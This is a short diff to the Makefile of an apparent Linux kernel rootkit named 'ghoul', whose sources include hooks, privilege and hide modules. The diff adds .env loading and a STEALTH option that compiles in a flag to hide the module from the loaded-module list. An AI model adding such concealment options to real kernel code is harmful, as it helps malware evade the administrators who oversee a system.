@@ -1,3 +1,8 @@
+ifneq (,$(wildcard ./.env))
+    include .env
+    export
+endif
+
 ifdef GHOUL_MODULE_NAME
 module_name = $(GHOUL_MODULE_NAME)
 else
@@ -6,6 +11,11 @@ endif
 obj-m += $(module_name).o
 $(module_name)-objs := ./src/$(module_name).o ./src/load.o ./src/hooks.o ./src/service.o ./src/privileges.o ./src/hide.o
 KVERSION = $(shell uname -r)
+
+# Compiler definitions from .env file
+ifeq ($(STEALTH_HIDE_MODULE_FROM_LIST), y)
+ccflags-y := -D HIDE_MODULE_FROM_LIST
+endif
 
 all:
 ifneq ($(module_name), ghoul)
